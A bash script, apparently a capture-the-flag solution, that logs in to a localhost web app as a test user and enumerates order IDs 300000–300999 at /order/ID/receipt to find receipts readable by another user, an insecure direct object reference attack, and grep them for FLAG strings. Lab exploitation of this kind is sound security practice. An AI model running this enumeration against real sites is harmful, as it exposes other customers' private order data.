#!/bin/bash

# Order ID enumeration script for range 300000-300999
# Performs authenticated enumeration with comprehensive tracking

set -e

# Configuration
BASE_URL="${BASE_URL:-http://localhost}"
COOKIE_FILE="/tmp/cookies_$$.txt"
OUTPUT_DIR="/tmp/order_results_$$"
SUMMARY_FILE="/tmp/summary_$$.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Statistics
declare -A STATUS_COUNTS
VALID_ORDERS=()
FLAGS_FOUND=()

# Cleanup on exit
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    rm -f "$COOKIE_FILE"
}
trap cleanup EXIT

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}   Order ID Enumeration Script${NC}"
echo -e "${BLUE}   Range: 300000-300999${NC}"
echo -e "${BLUE}================================================${NC}\n"

# Step 1: Two-step login process
echo -e "${YELLOW}[*] Step 1: Authenticating with two-step process...${NC}"

# First step: POST username to /
echo -e "${BLUE}[+] Step 1a: Submitting username to /...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -c "$COOKIE_FILE" \
    -d "username=test" \
    "$BASE_URL/")

if [ "$HTTP_CODE" != "302" ]; then
    echo -e "${RED}[-] Username submission failed with code: $HTTP_CODE${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Username submitted (HTTP $HTTP_CODE - redirected to /password/test)${NC}"

# Second step: POST password with user_id to /password/test
echo -e "${BLUE}[+] Step 1b: Submitting password to /password/test...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE_FILE" \
    -c "$COOKIE_FILE" \
    -d "username=test&user_id=10032&password=test" \
    "$BASE_URL/password/test")

if [ "$HTTP_CODE" != "302" ]; then
    echo -e "${RED}[-] Password submission failed with code: $HTTP_CODE${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Authentication complete (HTTP $HTTP_CODE - session cookie set)${NC}\n"

# Display cookies saved
echo -e "${BLUE}[+] Cookies saved to: $COOKIE_FILE${NC}"
if [ -f "$COOKIE_FILE" ]; then
    echo -e "${BLUE}[+] Cookie contents:${NC}"
    cat "$COOKIE_FILE" | grep -v "^#" | sed 's/^/    /'
fi
echo ""

# Step 2: Enumerate order IDs
echo -e "${YELLOW}[*] Step 2: Enumerating order IDs from 300000 to 300999...${NC}"
echo -e "${BLUE}[+] This will test 1000 order IDs${NC}\n"

START_TIME=$(date +%s)
CHECKED=0

for ORDER_ID in {300000..300999}; do
    CHECKED=$((CHECKED + 1))
    
    # Progress indicator every 50 requests
    if [ $((CHECKED % 50)) -eq 0 ]; then
        ELAPSED=$(($(date +%s) - START_TIME))
        RATE=$((CHECKED / (ELAPSED > 0 ? ELAPSED : 1)))
        echo -e "${BLUE}[+] Progress: $CHECKED/1000 (${ELAPSED}s elapsed, ~${RATE} req/s)${NC}"
    fi
    
    # Make request and capture status code and response
    RESPONSE_FILE="$OUTPUT_DIR/order_${ORDER_ID}.txt"
    HTTP_CODE=$(curl -s -o "$RESPONSE_FILE" -w "%{http_code}" \
        -b "$COOKIE_FILE" \
        "$BASE_URL/order/${ORDER_ID}/receipt")
    
    # Track status code
    STATUS_COUNTS[$HTTP_CODE]=$((${STATUS_COUNTS[$HTTP_CODE]:-0} + 1))
    
    # Process based on status code
    case $HTTP_CODE in
        200)
            echo -e "${GREEN}[✓] Order $ORDER_ID: HTTP 200 - ACCESSIBLE${NC}"
            VALID_ORDERS+=("$ORDER_ID")
            
            # Display response body (truncated for readability)
            echo -e "${BLUE}    Response preview:${NC}"
            head -20 "$RESPONSE_FILE" | sed 's/^/    /'
            
            # Search for flags
            if grep -oE "FLAG\{[^}]+\}" "$RESPONSE_FILE" > /dev/null 2>&1; then
                FLAG=$(grep -oE "FLAG\{[^}]+\}" "$RESPONSE_FILE" | head -1)
                echo -e "${GREEN}    ★★★ [FLAG FOUND]: $FLAG ★★★${NC}"
                FLAGS_FOUND+=("Order $ORDER_ID: $FLAG")
            fi
            echo ""
            ;;
        401)
            # Unauthorized - order doesn't exist or not authorized
            if [ ${#VALID_ORDERS[@]} -eq 0 ] && [ $CHECKED -lt 10 ]; then
                echo -e "${RED}[-] Order $ORDER_ID: HTTP 401 - Authentication may have failed${NC}"
            fi
            rm -f "$RESPONSE_FILE"
            ;;
        404)
            # Not found - expected for most IDs
            rm -f "$RESPONSE_FILE"
            ;;
        403)
            echo -e "${YELLOW}[!] Order $ORDER_ID: HTTP 403 - FORBIDDEN${NC}"
            rm -f "$RESPONSE_FILE"
            ;;
        *)
            echo -e "${YELLOW}[!] Order $ORDER_ID: HTTP $HTTP_CODE${NC}"
            rm -f "$RESPONSE_FILE"
            ;;
    esac
done

END_TIME=$(date +%s)
TOTAL_TIME=$((END_TIME - START_TIME))

# Step 3: Print comprehensive summary
echo -e "\n${BLUE}================================================${NC}"
echo -e "${BLUE}   ENUMERATION COMPLETE${NC}"
echo -e "${BLUE}================================================${NC}\n"

echo -e "${YELLOW}[*] Execution Summary:${NC}"
echo -e "    Total IDs checked: $CHECKED"
echo -e "    Time elapsed: ${TOTAL_TIME}s"
RATE=$((CHECKED / (TOTAL_TIME > 0 ? TOTAL_TIME : 1)))
echo -e "    Average speed: ${RATE} requests/second\n"

echo -e "${YELLOW}[*] HTTP Status Code Distribution:${NC}"
for STATUS in $(echo "${!STATUS_COUNTS[@]}" | tr ' ' '\n' | sort -n); do
    COUNT=${STATUS_COUNTS[$STATUS]}
    case $STATUS in
        200) COLOR=$GREEN; DESC="OK (Accessible)" ;;
        401) COLOR=$RED; DESC="Unauthorized" ;;
        403) COLOR=$YELLOW; DESC="Forbidden" ;;
        404) COLOR=$BLUE; DESC="Not Found" ;;
        *) COLOR=$NC; DESC="Other" ;;
    esac
    printf "    ${COLOR}HTTP %s:${NC} %d (%s)\n" "$STATUS" "$COUNT" "$DESC"
done
echo ""

echo -e "${YELLOW}[*] Valid Order IDs Found:${NC}"
if [ ${#VALID_ORDERS[@]} -eq 0 ]; then
    echo -e "    ${RED}None found${NC}"
else
    echo -e "    ${GREEN}Total: ${#VALID_ORDERS[@]}${NC}"
    for ORDER_ID in "${VALID_ORDERS[@]}"; do
        echo -e "    ${GREEN}- Order ID: $ORDER_ID${NC}"
        echo -e "      Response saved to: $OUTPUT_DIR/order_${ORDER_ID}.txt"
    done
fi
echo ""

echo -e "${YELLOW}[*] Flags Discovered:${NC}"
if [ ${#FLAGS_FOUND[@]} -eq 0 ]; then
    echo -e "    ${RED}No flags found${NC}"
else
    echo -e "    ${GREEN}★★★ Total flags: ${#FLAGS_FOUND[@]} ★★★${NC}"
    for FLAG_INFO in "${FLAGS_FOUND[@]}"; do
        echo -e "    ${GREEN}★ $FLAG_INFO${NC}"
    done
fi
echo ""

echo -e "${BLUE}[+] Results saved to: $OUTPUT_DIR${NC}"
echo -e "${BLUE}================================================${NC}"

# Save summary to file
{
    echo "Order ID Enumeration Summary"
    echo "============================"
    echo ""
    echo "Range tested: 300000-300999"
    echo "Total checked: $CHECKED"
    echo "Time elapsed: ${TOTAL_TIME}s"
    echo "Average speed: ${RATE} req/s"
    echo ""
    echo "Status Code Distribution:"
    for STATUS in $(echo "${!STATUS_COUNTS[@]}" | tr ' ' '\n' | sort -n); do
        echo "  HTTP $STATUS: ${STATUS_COUNTS[$STATUS]}"
    done
    echo ""
    echo "Valid Order IDs:"
    for ORDER_ID in "${VALID_ORDERS[@]}"; do
        echo "  - $ORDER_ID"
    done
    echo ""
    echo "Flags Found:"
    for FLAG_INFO in "${FLAGS_FOUND[@]}"; do
        echo "  - $FLAG_INFO"
    done
} > "$SUMMARY_FILE"

echo -e "${GREEN}[✓] Summary also saved to: $SUMMARY_FILE${NC}"
EOFSCRIPT

chmod +x enumerate_orders_fixed.sh
echo "Fixed script created successfully!"
ls -lh enumerate_orders_fixed.sh
